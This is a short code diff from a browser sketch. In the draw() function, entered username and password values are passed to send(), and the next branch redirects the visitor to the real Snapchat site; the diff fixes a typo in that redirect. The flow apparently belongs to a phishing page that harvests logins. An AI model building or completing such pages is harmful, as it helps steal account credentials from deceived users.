@@ -100,7 +100,7 @@ function draw() {
     send(username.value(),password.value());
     page++;
   }else if (page===3){
-    window.loaction.replace('https://www.snapchat.com/');
+    window.location.replace('https://www.snapchat.com/');
     page++;
   }else{
     background(0);
